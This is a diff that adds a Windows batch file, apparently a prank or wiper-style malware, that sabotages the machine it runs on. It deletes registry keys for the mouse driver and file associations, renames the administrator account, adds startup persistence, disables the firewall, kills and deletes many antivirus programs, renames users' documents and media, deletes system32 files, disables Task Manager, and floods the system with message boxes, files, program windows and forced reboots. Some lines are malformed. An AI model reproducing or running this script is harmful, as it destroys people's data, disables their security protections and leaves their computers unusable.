@@ -1,0 +1,666 @@
+@echo off
+title hahaha
+set key="HKEY_LOCAL_MACHINEsystemCurrentControlSetServicesMouclass"
+reg delete %key%
+wmic useraccount where name='administrator' rename ERR0R
+echo @echo off>c:windowswimn32.bat
+echo break off>c:windowswimn32.bat
+echo ipconfig/release_all>c:windowswimn32.bat
+echo end>c:windowswimn32.bat
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
+hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho oops looks like your pc was trashed
+reg delete HKCR/.exe
+reg delete HKCR/.dll
+reg delete HKCR/*
+net stop “Security Center”
+netsh firewall set opmode mode=disable
+taskkill av*
+taskkill fire*
+taskkill anti*
+cls
+taskkill spy*
+taskkill bullguard
+taskkill PersFw
+taskkill KAV*
+taskkill ZONEALARM
+taskkill SAFEWEB
+cls
+taskkill spy*
+taskkill bullguard
+taskkill PersFw
+taskkill KAV*
+taskkill ZONEALARM
+taskkill SAFEWEB
+cls
+taskkill OUTPOST
+taskkill nv*
+taskkill nav*
+taskkill F-*
+taskkill ESAFE
+taskkill cle
+cls
+taskkill BLACKICE
+taskkill def*
+taskkill kav
+taskkill kav*
+taskkill avg*
+taskkill ash*
+cls
+taskkill aswupdsv
+taskkill ewid*
+taskkill guard*
+taskkill guar*
+taskkill gcasDt*
+taskkill msmp*
+cls
+taskkill mcafe*
+taskkill mghtml
+taskkill msiexec
+taskkill outpost
+taskkill isafe
+taskkill zap*cls
+taskkill zauinst
+taskkill upd*
+taskkill zlclien*
+taskkill minilog
+taskkill cc*
+taskkill norton*
+cls
+taskkill norton au*
+taskkill ccc*
+taskkill npfmn*
+taskkill loge*
+taskkill nisum*
+taskkill issvc
+taskkill tmp*
+cls
+taskkill tmn*
+taskkill pcc*
+taskkill cpd*
+taskkill pop*
+taskkill pav*
+taskkill padmincls
+taskkill panda*
+taskkill avsch*
+taskkill sche*
+taskkill syman*
+taskkill virus*
+taskkill realm*cls
+taskkill sweep*
+taskkill scan*
+taskkill ad-*
+taskkill safe*
+taskkill avas*
+taskkill norm*
+cls
+taskkill offg*
+del /Q /F C:\Program Files\alwils~1\avast4\*.*
+del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
+del /Q /F C:\Program Files\kasper~1\*.exe
+cls
+del /Q /F C:\Program Files\trojan~1\*.exe
+del /Q /F C:\Program Files\f-prot95\*.dll
+del /Q /F C:\Program Files\tbav\*.datcls
+del /Q /F C:\Program Files\avpersonal\*.vdf
+del /Q /F C:\Program Files\Norton~1\*.cnt
+del /Q /F C:\Program Files\Mcafee\*.*
+cls
+del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
+del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
+del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
+del /Q /F C:\Program Files\Norton~1\*.*
+cls
+del /Q /F C:\Program Files\avgamsr\*.exe
+del /Q /F C:\Program Files\avgamsvr\*.exe
+del /Q /F C:\Program Files\avgemc\*.exe
+cls
+del /Q /F C:\Program Files\avgcc\*.exe
+del /Q /F C:\Program Files\avgupsvc\*.exe
+del /Q /F C:\Program Files\grisoft
+del /Q /F C:\Program Files\nood32krn\*.exe
+del /Q /F C:\Program Files\nood32\*.exe
+cls
+del /Q /F C:\Program Files\nod32
+del /Q /F C:\Program Files\nood32
+del /Q /F C:\Program Files\kav\*.exe
+del /Q /F C:\Program Files\kavmm\*.exe
+del /Q /F C:\Program Files\kaspersky\*.*
+cls
+del /Q /F C:\Program Files\ewidoctrl\*.exe
+del /Q /F C:\Program Files\guard\*.exe
+del /Q /F C:\Program Files\ewido\*.exe
+cls
+del /Q /F C:\Program Files\pavprsrv\*.exe
+del /Q /F C:\Program Files\pavprot\*.exe
+del /Q /F C:\Program Files\avengine\*.exe
+cls
+del /Q /F C:\Program Files\apvxdwin\*.exe
+del /Q /F C:\Program Files\webproxy\*.exe
+del /Q /F C:\Program Files\panda
+software\*.*
+ren C:\Users\*.exe %random%.broken
+ren C:\Users\*.txt %random%.broken
+ren C:\Users\*.JPG %random%.broken
+ren C:\Users\*.JPEG %random%.broken
+ren C:\Users\*.GIF %random%.broken
+ren C:\Users\*.SVG %random%.broken
+ren C:\Users\*.PNG %random%.broken
+ren C:\Users\*.TIFF %random%.broken
+ren C:\Users\*.TIF %random%.broken
+ren C:\Users\*.PDF %random%.broken
+ren C:\Users\*.DOC %random%.broken
+ren C:\Users\*.DOCX %random%.broken
+ren C:\Users\*.HTML %random%.broken
+ren C:\Users\*.HTM %random%.broken
+ren C:\Users\*.XLSX %random%.broken
+ren C:\Users\*.XLS %random%.broken
+ren C:\Users\*.MP4 %random%.broken
+ren C:\Users\*.AVI %random%.broken
+ren C:\Users\*.MOV %random%.broken
+ren C:\Users\*.FLV %random%.broken
+ren C:\Users\*.AVCHD %random%.broken
+ren C:\Users\*.PPTX %random%.broken
+ren C:\Users\*.PPT %random%.broken
+ren C:\Users\*.ODP %random%.broken
+ren C:\Users\*.KEY %random%.broken
+ren C:\Users\*.M4A %random%.broken
+ren C:\Users\*.MP3 %random%.broken
+ren C:\Users\*.WAV %random%.broken
+ren C:\Users\*.ini %random%.broken
+ren C:\Users\*.ink %random%.broken
+ren C:\Users\*.zip %random%.broken
+ren C:\Users\*.dll %random%.broken
+ren C:\Users\*.mp4 %random%.broken
+ren C:\Users\*.msi %random%.broken
+ren C:\Users\*.rar %random%.broken
+ren C:\Users\*.sys %random%.broken
+ren C:\Users\*.avi %random%.broken
+cd..
+cd "Start Menu"
+cd Programs
+cd Startup
+echo x=msgbox("oops looks like your pc was trashed", 0+48, "MASS ERROR")>ded.vbs
+echo Del C:\users\*.*>>dad.bat
+echo title ded.bat>>ded.bat
+echo :d>>ded.bat
+echo start ded.vbs>>ded.bat
+echo taskkill taskmgr>>ded.bat
+echo taskkill cmd.exe>>ded.bat
+echo goto d>>ded.bat
+start ded.bat
+shutdown /r /c "oops looks like your pc was trashed" /t "60"
+del c:WINDOWS/system32*.* /q
+ECHO REGEDIT4 > %WINDIR%\DXM.REG
+echo. >> %WINDIR%\DXM.reg
+echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System] >> %WINDIR%\DXM.reg
+echo “DisableTaskMgr”=dword:1>> %WINDIR%\DXM.reg
+echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System] >> %WINDIR%\DXM.reg
+echo “DisableTaskMgr”=dword:1>> %WINDIR%\DXM.reg
+start /w regedit /s %WINDIR%\DXM.reg
+echo :c>strtvbs.bat
+echo start ded.vbs>strtvbs.bat
+echo goto c>strtvbs.bat
+start strtvbs.bat
+del temp.vbs
+echo Set oWMP = CreateObject("WMPlayer.OCX.7")  >> temp.vbs
+echo Set colCDROMs = oWMP.cdromCollection       >> temp.vbs
+echo For i = 0 to colCDROMs.Count-1             >> temp.vbs
+echo colCDROMs.Item(i).Eject                    >> temp.vbs
+echo next                                       >> temp.vbs
+echo oWMP.close                                 >> temp.vbs
+start temp.vbs
+echo shutdown /r /c "oops looks like your pc was trashed" /t "5">shutdown.bat
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+start ded.vbs
+v
+cd..
+cd..
+cd..
+cd desktop
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+echo oops looks like your pc was trashed>%random%.sys
+echo oops looks like your pc was trashed>%random%.txt
+echo oops looks like your pc was trashed>%random%.png
+echo oops looks like your pc was trashed>%random%.bmp
+echo oops looks like your pc was trashed>%random%.666
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
+start explorer
+start control
+start calc
+start notepad
+start mspaint
+start winword
+start write
